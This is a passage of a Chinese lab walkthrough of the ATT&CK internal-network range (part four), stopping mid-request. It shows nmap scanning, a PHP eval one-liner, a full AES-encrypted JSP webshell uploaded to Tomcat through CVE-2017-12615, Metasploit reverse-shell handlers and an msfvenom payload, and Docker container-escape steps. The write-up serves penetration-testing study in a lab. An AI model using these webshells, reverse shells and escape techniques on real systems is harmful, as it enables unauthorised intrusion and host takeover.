{"title":"内网靶场实战——ATT&CK实战系列（四）","uid":"6a98a1dbb5c5e5a32e4331613d5b5f80","slug":"内网靶场实战——ATT&CK实战系列（四）","date":"2023-04-11T17:32:20.000Z","updated":"2024-02-14T07:48:48.000Z","comments":true,"path":"api/articles/内网靶场实战——ATT&CK实战系列（四）.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304120134292.jpeg","content":"<h1 id=\"环境搭建\"><a href=\"#环境搭建\" class=\"headerlink\" title=\"环境搭建\"></a>环境搭建</h1><p>环境地址如下：</p>\n<p><a href=\"http://39.98.79.56/vuln/detail/6/\">http://39.98.79.56/vuln/detail/6/</a></p>\n<p>接下来下载好后在VmWare中进行ovf导入即可，共计三个文件<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304111359430.png\" alt=\"image-20230411135857354\"></p>\n<p>接下来配置网络环境，在虚拟网络编辑器中添加两个网段</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token number\">1</span>、<span class=\"token number\">192.168</span><span class=\"token number\">.1</span><span class=\"token number\">.0</span> <span class=\"token constant\">NAT</span>模式 用于外网\n<span class=\"token number\">2</span>、<span class=\"token number\">192.168</span><span class=\"token number\">.183</span><span class=\"token number\">.0</span> 仅主机模式 用于内网<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304111403167.png\" alt=\"image-20230411140340096\"></p>\n<p>接下来给三个虚拟机以及攻击机(kali)进行分配</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token constant\">DC</span><span class=\"token punctuation\">:</span> <span class=\"token function\">VMet8</span><span class=\"token punctuation\">(</span><span class=\"token number\">192.168</span><span class=\"token number\">.183</span><span class=\"token number\">.130</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">Web</span><span class=\"token punctuation\">(</span>Ubuntu<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token class-name return-type\">VMet4</span>、<span class=\"token function\">VMet8</span><span class=\"token punctuation\">(</span><span class=\"token number\">192.168</span><span class=\"token number\">.1</span><span class=\"token number\">.130</span>、<span class=\"token number\">192.168</span><span class=\"token number\">.183</span><span class=\"token number\">.128</span><span class=\"token punctuation\">)</span>\nWin7<span class=\"token punctuation\">:</span> <span class=\"token function\">VMet8</span><span class=\"token punctuation\">(</span><span class=\"token number\">192.168</span><span class=\"token number\">.183</span><span class=\"token number\">.129</span><span class=\"token punctuation\">)</span>\nKali<span class=\"token punctuation\">:</span> <span class=\"token function\">VMet4</span><span class=\"token punctuation\">(</span><span class=\"token number\">192.168</span><span class=\"token number\">.1</span><span class=\"token number\">.129</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>开机账密如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token function\">web</span><span class=\"token punctuation\">(</span>ubuntu<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token class-name return-type\">ubuntu</span>\nwin7 douser<span class=\"token punctuation\">:</span> Dotest123\n<span class=\"token constant\">DC</span><span class=\"token punctuation\">:</span> administrator<span class=\"token punctuation\">:</span> Test2008 <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>接下来用<code>Kali</code>虚拟机去ping<code>Ubuntu</code></p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304111404632.png\" alt=\"image-20230411140455602\"></p>\n<p>尝试<code>Ubuntu</code>虚拟机去ping<code>DC域控</code></p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304111405042.png\" alt=\"image-20230411140559011\"></p>\n<p>尝试<code>Win7</code>虚拟机去ping<code>DC域控</code></p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304111406832.png\" alt=\"image-20230411140642804\"></p>\n<p>尝试<code>DC域控</code>ping另外两台域内机器</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304111407298.png\" alt=\"image-20230411140736264\"></p>\n<p>皆可ping通，至此环境搭建完成，接下来在<code>ubuntu</code>虚拟机中开启环境</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">sudo su\ndocker ps <span class=\"token operator\">-</span>a <span class=\"token comment\">//查看以往开启容器</span>\ndocker start ec814f6ee002 \ndocker start <span class=\"token number\">174745108</span>fcb\ndocker start <span class=\"token number\">09</span>dd4e5bfa91\ndocker start ad7866b3df9b\ndocker ps <span class=\"token comment\">//查看当前运行容器</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304111421952.png\" alt=\"image-20230411142154891\"></p>\n<h1 id=\"外网打点\"><a href=\"#外网打点\" class=\"headerlink\" title=\"外网打点\"></a>外网打点</h1><p>打开<code>Kali</code>，先用nmap对外网<code>192.168.1.130</code>进行扫描</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">nmap <span class=\"token operator\">-</span>p1<span class=\"token operator\">-</span><span class=\"token number\">65535</span> <span class=\"token operator\">-</span>Pn <span class=\"token operator\">-</span><span class=\"token constant\">A</span> <span class=\"token operator\">-</span><span class=\"token constant\">T4</span> <span class=\"token number\">192.168</span><span class=\"token number\">.1</span><span class=\"token number\">.130</span>\n<span class=\"token comment\">//-p1-65535 指扫描1-65535端口</span>\n<span class=\"token comment\">//-Pn 指不被主机发现</span>\n<span class=\"token comment\">// -A 指进行操作系统指纹识别</span>\n<span class=\"token comment\">// -T4 指扫描速度最快</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304111429142.png\" alt=\"image-20230411142915895\"></p>\n<h2 id=\"PHPMyadmin\"><a href=\"#PHPMyadmin\" class=\"headerlink\" title=\"PHPMyadmin\"></a>PHPMyadmin</h2><p>扫描探测出2003端口开放<code>phpmyadmin</code>服务，接下来访问看是否能写入文件</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304111436511.png\" alt=\"image-20230411143648399\"></p>\n<p>回显<code>NULL</code>，即禁止写入，只能再找其他方法了</p>\n<p>在nmap扫描后注意到<code>Phpmyadmin</code>版本为<code>4.8.1</code>，在网上搜索相关漏洞</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304111437442.png\" alt=\"image-20230411143734378\"></p>\n<p>发现远程文件包含漏洞，简单了解过后发现思路就是写一个恶意查询语句，例如<code>select &#39;&lt;?phpinfo();?&gt;&#39;</code>，然后包含有这个语句的日志文件，即可实现远程文件包含，我们的RCE也从中得来（更换php内容为一句话木马即可）。</p>\n<p>所以接下来查询一下日志状态</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">SELECT '<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> @<span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span>'<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304111447309.png\" alt=\"image-20230411144714189\"></p>\n<p>发现日志处于关闭状态，我们进行开启</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token constant\">SET</span> <span class=\"token keyword\">GLOBAL</span> general_log<span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'on'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304111455390.png\" alt=\"image-20230411145557309\"></p>\n<p>这里发现权限不足，无法开启，因此我们无法通过开启日志的方法来进行写入shell，而禁止导入导出也注定我们无法去直接写shell，因此这个服务放弃，切换另一个。</p>\n<h2 id=\"Tomcat-getshell\"><a href=\"#Tomcat-getshell\" class=\"headerlink\" title=\"Tomcat getshell\"></a>Tomcat getshell</h2><p>接下来看向2002端口，它是一个<code>Apache Tomcat 8.5.19</code>服务，搜索相关漏洞</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304111458454.png\" alt=\"image-20230411145844339\"></p>\n<p>发现<code>CVE-2017-12615</code>，尝试复现</p>\n<p>访问2002端口，并抓包</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304111504132.png\" alt=\"image-20230411150412027\"></p>\n<p>修改方法为<code>PUT</code>，上传jsp一句话木马</p>\n<p><strong>注：直接写shell.jsp无法上传，我们可以用三种方式绕过，shell.jsp/ 或shell.jsp::$DATA 或 shell.jsp%20</strong></p>\n<p>一句话木马内容如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span><span class=\"token operator\">%</span>@page import<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"</span><span class=\"token operator\">%</span><span class=\"token operator\">></span><span class=\"token operator\">&lt;</span><span class=\"token operator\">%</span><span class=\"token operator\">!</span><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">U</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">ClassLoader</span><span class=\"token punctuation\">&#123;</span><span class=\"token function\">U</span><span class=\"token punctuation\">(</span>ClassLoader c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token function\">super</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">public</span> <span class=\"token keyword\">Class</span> <span class=\"token class-name-definition class-name\">g</span><span class=\"token punctuation\">(</span>byte <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">return</span> super<span class=\"token operator\">.</span><span class=\"token function\">defineClass</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>b<span class=\"token operator\">.</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span><span class=\"token operator\">%</span><span class=\"token operator\">></span><span class=\"token operator\">&lt;</span><span class=\"token operator\">%</span><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>request<span class=\"token operator\">.</span><span class=\"token function\">getMethod</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token function\">equals</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"POST\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token keyword type-declaration\">String</span> k<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"e45e329feb5d925b\"</span><span class=\"token punctuation\">;</span><span class=\"token comment\">/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/</span>session<span class=\"token operator\">.</span><span class=\"token function\">putValue</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"u\"</span><span class=\"token punctuation\">,</span>k<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>Cipher c<span class=\"token operator\">=</span>Cipher<span class=\"token operator\">.</span><span class=\"token function\">getInstance</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"AES\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>c<span class=\"token operator\">.</span><span class=\"token function\">init</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">SecretKeySpec</span><span class=\"token punctuation\">(</span>k<span class=\"token operator\">.</span><span class=\"token function\">getBytes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"AES\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">U</span><span class=\"token punctuation\">(</span>this<span class=\"token operator\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token function\">getClassLoader</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token function\">g</span><span class=\"token punctuation\">(</span>c<span class=\"token operator\">.</span><span class=\"token function\">doFinal</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">sun</span><span class=\"token operator\">.</span>misc<span class=\"token operator\">.</span><span class=\"token function\">BASE64Decoder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token function\">decodeBuffer</span><span class=\"token punctuation\">(</span>request<span class=\"token operator\">.</span><span class=\"token function\">getReader</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token function\">readLine</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token function\">newInstance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token function\">equals</span><span class=\"token punctuation\">(</span>pageContext<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span class=\"token operator\">%</span><span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304111511119.png\" alt=\"image-20230411151106982\"></p>\n<p>接下来用冰蝎连接<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304111512766.png\" alt=\"image-20230411151251684\"></p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304111513879.png\" alt=\"image-20230411151300725\"></p>\n<p>成功getshell</p>\n<h2 id=\"Struts2\"><a href=\"#Struts2\" class=\"headerlink\" title=\"Struts2\"></a>Struts2</h2><p>发现2001端口为Struts2服务，用漏扫工具扫描出漏洞，亦可getshell</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304111541767.png\" alt=\"image-20230411154108556\"></p>\n<h2 id=\"Msf上线\"><a href=\"#Msf上线\" class=\"headerlink\" title=\"Msf上线\"></a>Msf上线</h2><p>由于冰蝎这种是非交互式的shell，所以我们需要进行反弹shell来得到一个可交互shell，这里直接上线msf</p>\n<p>首先在kali处进入msf，开启监听</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">msfconsole  <span class=\"token comment\">//进入框架</span>\n<span class=\"token keyword\">use</span> <span class=\"token package\">exploit</span><span class=\"token operator\">/</span>multi<span class=\"token operator\">/</span>handler                      <span class=\"token comment\">//载入模块</span>\nset payload java<span class=\"token operator\">/</span>meterpreter<span class=\"token operator\">/</span>reverse_tcp    <span class=\"token comment\">//加载攻击负载核</span>\nset lhost <span class=\"token number\">192.168</span><span class=\"token number\">.1</span><span class=\"token number\">.129</span>                   <span class=\"token comment\">//设置本地监听地址</span>\nset lport <span class=\"token number\">7777</span>                          <span class=\"token comment\">//设置本地监听端口</span>\nrun                            <span class=\"token comment\">//开始执行，等待目标上线</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>而后在冰蝎进行对应即可</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304111602536.png\" alt=\"image-20230411160258332\"></p>\n<p>此时成功上线msf，接下来<code>sessions 1</code> 即可进入会话</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304111609148.png\" alt=\"image-20230411160928925\"></p>\n<h3 id=\"方法二\"><a href=\"#方法二\" class=\"headerlink\" title=\"方法二\"></a>方法二</h3><p>除了利用冰蝎进行反弹shell，我们也可以通过生成msf木马，然后上传到服务器去执行来获取shell</p>\n<p>具体如下</p>\n<p>首先生成msf木马</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">msfvenom <span class=\"token operator\">-</span>p linux<span class=\"token operator\">/</span>x86<span class=\"token operator\">/</span>meterpreter<span class=\"token operator\">/</span>reverse_tcp <span class=\"token constant\">LHOST</span><span class=\"token operator\">=</span><span class=\"token number\">192.168</span><span class=\"token number\">.1</span><span class=\"token number\">.129</span> <span class=\"token constant\">LPORT</span><span class=\"token operator\">=</span><span class=\"token number\">7777</span> <span class=\"token operator\">-</span>f elf <span class=\"token operator\">></span>shell<span class=\"token operator\">.</span>elf<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>接下来开启另一个终端，对本机7777端口进行监听</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">msfconsole\n<span class=\"token keyword\">use</span> <span class=\"token package\">exploit</span><span class=\"token operator\">/</span>multi<span class=\"token operator\">/</span>handler\nset lhost <span class=\"token number\">192.168</span><span class=\"token number\">.1</span><span class=\"token number\">.129</span>\nset lport <span class=\"token number\">7777</span>\nset payload linux<span class=\"token operator\">/</span>x86<span class=\"token operator\">/</span>meterpreter<span class=\"token operator\">/</span>reverse_tcp\nrun<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>将木马上传至<code>var/tmp</code>目录下，接下来<code>chmod +x shell.elf</code>赋予执行权限，而后<code>./shell.elf</code>执行木马文件</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304111617516.png\" alt=\"image-20230411161742462\"></p>\n<p>此时查看msf</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304111618381.png\" alt=\"image-20230411161847335\"></p>\n<p>成功上线</p>\n<h2 id=\"Docker逃逸\"><a href=\"#Docker逃逸\" class=\"headerlink\" title=\"Docker逃逸\"></a>Docker逃逸</h2><p>执行<strong>ip -addr</strong>查看当前ip</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304111635295.png\" alt=\"image-20230411163512082\"></p>\n<p>发现是172.xx，怀疑是docker环境，对于docker的验证，我们有如下两个方法</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">是否存在<span class=\"token operator\">.</span>dockerenv文件<span class=\"token punctuation\">:</span>\ndocker环境下存在：ls <span class=\"token operator\">-</span>alh <span class=\"token operator\">/</span><span class=\"token operator\">.</span>dockerenv 文件\n\n查询系统进程的cgroup信息<span class=\"token punctuation\">:</span>\ndocker环境下 cat <span class=\"token operator\">/</span>proc<span class=\"token operator\">/</span><span class=\"token number\">1</span><span class=\"token operator\">/</span>cgroup<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304111639105.png\" alt=\"image-20230411163905997\"></p>\n<p>说明的确是docker环境，我们想进一步渗透，必须进行容器逃逸，到服务器中。接下来寻找Docker逃逸的漏洞，找到这篇文章</p>\n<p><a href=\"https://www.freebuf.com/articles/container/242763.html\">https://www.freebuf.com/articles/container/242763.html</a></p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token number\">1</span>、Dirty Cow（<span class=\"token constant\">CVE</span><span class=\"token operator\">-</span><span class=\"token number\">2016</span><span class=\"token operator\">-</span><span class=\"token number\">5195</span>）：Linux内核中的权限提升漏洞\n<span class=\"token number\">2</span>、<span class=\"token constant\">CVE</span><span class=\"token operator\">-</span><span class=\"token number\">2019</span><span class=\"token operator\">-</span><span class=\"token number\">5736</span>\n<span class=\"token number\">3</span>、emote api 未授权访问<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"CVE-2019-5736\"><a href=\"#CVE-2019-5736\" class=\"headerlink\" title=\"CVE-2019-5736\"></a>CVE-2019-5736</h3><p>1、漏洞原理：<br>Docker、containerd或者其他基于runc的容器在运行时存在安全漏洞，攻击者可以通过特定的容器镜像或者exec操作获取到宿主机runc执行时的文件句柄并修改掉runc的二进制文件，从而获取到宿主机的root执行权限。</p>\n<p>2、影响版本：</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">docker version <span class=\"token operator\">&lt;=</span><span class=\"token number\">18.09</span><span class=\"token number\">.2</span>\nRunC version <span class=\"token operator\">&lt;=</span><span class=\"token number\">1.0</span><span class=\"token operator\">-</span>rc6<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>3、尝试</p>\n<p>首先将payload下载到kali中,Poc链接<a href=\"https://github.com/Frichetten/CVE-2019-5736-PoC\">https://github.com/Frichetten/CVE-2019-5736-PoC</a></p>\n<p>接下来需要修改一下payload，改成如下形式即可(即反弹shell指令)</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304111717553.png\" alt=\"image-20230411171742434\"></p>\n<p>而后因为这个是go文件，我们需要下载go环境</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">sudo apt<span class=\"token operator\">-</span>get update\nsudo apt install gccgo<span class=\"token operator\">-</span>go \nsudo apt install golang<span class=\"token operator\">-</span>go<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>接下来对Poc文件进行编译</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">source <span class=\"token operator\">/</span>etc<span class=\"token operator\">/</span>profile   <span class=\"token comment\">//配置go环境</span>\n \n<span class=\"token constant\">CGO_ENABLED</span><span class=\"token operator\">=</span><span class=\"token number\">0</span> <span class=\"token constant\">GOOS</span><span class=\"token operator\">=</span>linux <span class=\"token constant\">GOARCH</span><span class=\"token operator\">=</span>amd64 go build main<span class=\"token operator\">.</span>go  <span class=\"token comment\">//编译生成</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>而后进入msf，将这个go文件进行上传</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">upload <span class=\"token operator\">/</span>tools<span class=\"token operator\">/</span>dockerrun<span class=\"token operator\">/</span>main<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304111719407.png\" alt=\"image-20230411171947354\"></p>\n<p>可以看到成功上传，接下来在kali处监听8888端口(<strong>nc -lvnp 8888</strong>)</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304111720818.png\" alt=\"image-20230411172006772\"></p>\n<p>接下来回到msf中，给main文件附加权限，并执行</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304111720048.png\" alt=\"image-20230411172044012\"></p>\n<p>此时虽回显成功，但在kali中并未接收到shell，因此这个方法不可行。</p>\n<h3 id=\"特权模式逃逸\"><a href=\"#特权模式逃逸\" class=\"headerlink\" title=\"特权模式逃逸\"></a>特权模式逃逸</h3><p><strong>利用docker的特权模式来在宿主机硬盘中写入ssh私钥，实现ssh免密登录宿主机，从而实现对目标宿主机的控制。</strong></p>\n<p>详细介绍如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">特权模式于版本<span class=\"token number\">0.6</span>时被引入Docker，允许容器内的root拥有外部物理机root权限，而此前容器内root用户仅拥有外部物理机普通用户权限。\n使用特权模式启动容器，可以获取大量设备文件访问权限。因为当管理员执行docker run —privileged时，Docker容器将被允许访问主机上的所有设备，并可以执行mount命令进行挂载。\n当控制使用特权模式启动的容器时，docker管理员可通过mount命令将外部宿主机磁盘设备挂载进容器内部，获取对整个宿主机的文件读写权限，此外还可以通过写入计划任务等方式在宿主机执行命令。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n\n\n<p>第一步，挂载磁盘</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">fdisk <span class=\"token operator\">-</span>l <span class=\"token comment\">//查看磁盘分区情况</span>\nmkdir <span class=\"token operator\">/</span>qwq <span class=\"token comment\">//新建目录qwq</span>\nmount <span class=\"token operator\">/</span>dev<span class=\"token operator\">/</span>sda1 <span class=\"token operator\">/</span>qwq <span class=\"token comment\">//挂载到新目录</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304111728858.png\" alt=\"image-20230411172838747\"></p>\n<p>我们这里发现<code>sda1</code>在<code>/dev/sda1</code>下，我们新建个目录并将<code>/dev/sda1</code>挂载到新目录下。</p>\n<p>此时执行<code>ls /qwq</code>，若有回显则说明成功挂载。</p>\n<p>emm，突然执行命令无回显了，所以我重新上传了一个jsp木马</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token constant\">PUT</span> <span class=\"token operator\">/</span>shell<span class=\"token operator\">.</span>jsp<span class=\"token operator\">/</span> <span class=\"token constant\">HTTP</span><span class=\"token operator\">/</span><span class=\"token number\">1.1</span>\nHost<span class=\"token punctuation\">:</span> <span class=\"token number\">192.168</span><span class=\"token number\">.1</span><span class=\"token number\">.130</span><span class=\"token punctuation\">:</span><span class=\"token number\">2002</span>\nPragma<span class=\"token punctuation\">:</span> no<span class=\"token operator\">-</span>cache\nCache<span class=\"token operator\">-</span>Control<span class=\"token punctuation\">:</span> no<span class=\"token operator\">-</span>cache\nUpgrade<span class=\"token operator\">-</span>Insecure<span class=\"token operator\">-</span>Requests<span class=\"token punctuation\">:</span> <span class=\"token number\">1</span>\nUser<span class=\"token operator\">-</span>Agent<span class=\"token punctuation\">:</span> Mozilla<span class=\"token operator\">/</span><span class=\"token number\">5.0</span> <span class=\"token punctuation\">(</span>Windows <span class=\"token constant\">NT</span> <span class=\"token number\">10.0</span><span class=\"token punctuation\">;</span> Win64<span class=\"token punctuation\">;</span> x64<span class=\"token punctuation\">)</span> AppleWebKit<span class=\"token operator\">/</span><span class=\"token number\">537.36</span> <span class=\"token punctuation\">(</span><span class=\"token constant\">KHTML</span><span class=\"token punctuation\">,</span> like Gecko<span class=\"token punctuation\">)</span> Chrome<span class=\"token operator\">/</span><span class=\"token number\">111.0</span><span class=\"token number\">.0</span><span class=\"token number\">.0</span> Safari<span class=\"token operator\">/</span><span class=\"token number\">537.36</span>\nAccept<span class=\"token punctuation\">:</span> text<span class=\"token operator\">/</span>html<span class=\"token punctuation\">,</span>application<span class=\"token operator\">/</span>xhtml<span class=\"token operator\">+</span>xml<span class=\"token punctuation\">,</span>application<span class=\"token operator\">/</span>xml<span class=\"token punctuation\">;</span>q<span class=\"token operator\">=</span><span class=\"token number\">0.9</span><span class=\"token punctuation\">,</span>image<span class=\"token operator\">/</span>avif<span class=\"token punctuation\">,</span>image<span class=\"token operator\">/</span>webp<span class=\"token punctuation\">,</span>image<span class=\"token operator\">/</span>apng<span class=\"token punctuation\">,</span><span class=\"token operator\">*</span><span class=\"token operator\">/</span><span class=\"token operator\">*</span><span class=\"token punctuation\">;</span>q<span class=\"token operator\">=</span><span class=\"token number\">0.8</span><span class=\"token punctuation\">,</span>application<span class=\"token operator\">/</span>signed<span class=\"token operator\">-</span>exchange<span class=\"token punctuation\">;</span>v<span class=\"token operator\">=</span>b3<span class=\"token punctuation\">;</span>q<span class=\"token operator\">=</span><span class=\"token number\">0.7</span>\nAccept<span class=\"token operator\">-</span>Encoding<span class=\"token punctuation\">:</span> gzip<span class=\"token punctuation\">,</span> deflate\nAccept<span class=\"token operator\">-</span>Language<span class=\"token punctuation\">:</span> zh<span class=\"token operator\">-</span><span class=\"token constant\">CN</span><span class=\"token punctuation\">,</span>zh<span class=\"token punctuation\">;</span>q<span class=\"token operator\">=</span><span class=\"token number\">0.9</span><span class=\"token punctuation\">,</span>en<span class=\"token operator\">-</span><span class=\"token constant\">US</span><span class=\"token punctuation\">;</span>q<span class=\"token operator\">=</span><span class=\"token number\">0.8</span><span class=\"token punctuation\">,</span>en<span class=\"token punctuation\">;</span>q<span class=\"token operator\">=</span><span class=\"token number\">0.7</span><span class=\"token punctuation\">,</span>zh<span class=\"token operator\">-</span><span class=\"token constant\">HK</span><span class=\"token punctuation\">;</span>q<span class=\"token operator\">=</span><span class=\"token number\">0.6</span>\nCookie<span class=\"token punctuation\">:</span> <span class=\"token constant\">JSESSIONID</span><span class=\"token 